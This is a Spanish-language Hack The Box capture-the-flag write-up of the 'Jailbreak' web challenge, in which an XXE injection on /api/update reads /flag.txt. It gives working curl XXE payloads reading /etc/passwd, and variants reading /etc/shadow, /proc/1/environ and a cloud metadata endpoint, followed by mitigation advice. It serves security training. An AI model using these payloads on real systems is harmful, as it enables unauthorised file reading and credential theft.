---
title: "Jailbreak"
description: "Writeup de Jailbreak - Hack The Box - Web 200pts. Endpoint /api/update vulnerable a XXE injection; entidad externa lee /flag.txt del servidor y lo devuelve en la respuesta JSON."
sidebar:
  badge:
    text: Web
    variant: note
tags:
  - htb
  - web
  - xxe
  - xml
  - file-read
  - api
---

# Jailbreak

> 🎯 Plataforma: Hack The Box
> 📂 Categoría: Web
> 🏆 Puntos: 200
> 👤 Autor: warrior866

---

## Descripción

Aplicación web con un endpoint `/api/update` que procesa XML. El parser XML no tiene habilitada la protección contra entidades externas (XXE), permitiendo leer archivos arbitrarios del servidor.

---

## Reconocimiento

Interceptar una petición legítima al endpoint `/api/update` con Burp Suite. La aplicación envía y procesa XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<update>
  <setting>theme</setting>
  <value>dark</value>
</update>
```

---

## Prueba de XXE

Modificar la petición para incluir una definición de entidad externa:

```bash
curl -s -X POST "$HOST/api/update" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE update [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<update>
  <setting>theme</setting>
  <value>&xxe;</value>
</update>'
```

Si la respuesta incluye el contenido de `/etc/passwd`, XXE es explotable.

---

## Lectura de la flag

```bash
curl -s -X POST "$HOST/api/update" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE update [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<update>
  <setting>flag</setting>
  <value>&xxe;</value>
</update>'
```

```json
{
  "status": "updated",
  "setting": "flag",
  "value": "HTB{FLAG}"
}
```

La flag se devuelve en el campo `value` de la respuesta JSON porque el parser expande la entidad `&xxe;` al contenido del archivo antes de procesar el XML.

---

## Cadena de Ataque

```text
1. Identificar endpoint /api/update que procesa XML
       ↓
2. Inyectar DOCTYPE con ENTITY SYSTEM apuntando a file:///flag.txt
       ↓
3. Referenciar &xxe; en el body del XML
       ↓
4. Parser XML expande la entidad → devuelve contenido del fichero
       ↓
5. flag en la respuesta JSON
```

---

## Variantes adicionales

**SSRF via XXE** (acceder a servicios internos):

```xml
<!DOCTYPE update [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
```

**Lectura de archivos de configuración**:

```xml
<!ENTITY xxe SYSTEM "file:///etc/shadow">
<!ENTITY xxe SYSTEM "file:///proc/1/environ">
```

---

## Lecciones Aprendidas

- **XXE en APIs REST**: aunque REST suele usar JSON, algunos endpoints también aceptan XML. Verificar todos los `Content-Type` soportados, incluyendo `application/xml` y `text/xml`.
- **Deshabilitar entidades externas**: en librerías XML (libxml2, Java SAX, etc.), deshabilitar explícitamente `FEATURE_EXTERNAL_GENERAL_ENTITIES` y `FEATURE_EXTERNAL_PARAMETER_ENTITIES`.
- **Validación del parser**: usar un parser XML seguro o un schema (XSD) que no permita DOCTYPE declarations.

---

## Referencias

- [OWASP — XXE Prevention](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger — XXE](https://portswigger.net/web-security/xxe)
- [HackTricks — XXE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
